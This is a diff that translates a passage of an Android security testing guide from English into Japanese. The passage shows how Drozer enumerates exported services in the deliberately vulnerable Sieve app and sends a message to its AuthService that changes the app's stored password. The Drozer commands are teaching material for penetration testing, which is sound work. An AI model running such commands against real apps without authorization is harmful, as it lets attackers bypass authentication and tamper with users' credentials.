@@ -300,9 +300,9 @@ dz> run app.activity.start --component com.mwr.example.sieve com.mwr.example.sie
 
 アクティビティが直接呼び出されたため、パスワードマネージャを保護するログインフォームはバイパスされ、パスワードマネージャに含まれるデータにアクセスすることができます。
 
-##### Services
+##### サービス
 
-Services can be enumerated using the Drozer module `app.service.info`:
+サービスは Drozer モジュール `app.service.info` を使用して列挙できます。
 
 ```
 dz> run app.service.info -a com.mwr.example.sieve
@@ -313,7 +313,7 @@ Package: com.mwr.example.sieve
     Permission: null
 ```
 
-To communicate with a service, static analysis must first be used to identify the required inputs. By reversing the target application we can see the service `AuthService` provides functionality to change the password and PIN protecting the target app.
+サービスと通信するには、静的解析を最初に使用して必要な入力を特定する必要があります。ターゲットアプリケーションをリバースすることで、サービス `AuthService` がターゲットアプリを保護するパスワードと PIN を変更する機能を提供することが分かります。
 
 ```
    public void handleMessage(Message msg) {
@@ -344,7 +344,7 @@ To communicate with a service, static analysis must first be used to identify th
                     }
 ```
 
-Since this service is exported, it is possible to use the module `app.service.send` to communicate with the service and change the password stored in the target application:
+このサービスはエクスポートされるため、モジュール `app.service.send` を使用してサービスと通信し、ターゲットアプリケーションに格納されているパスワードを変更することが可能です。
 
 ```
 dz> run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService --msg  6345 7452 1 --extra string com.mwr.example.sieve.PASSWORD "abcdabcdabcdabcd" --bundle-as-obj
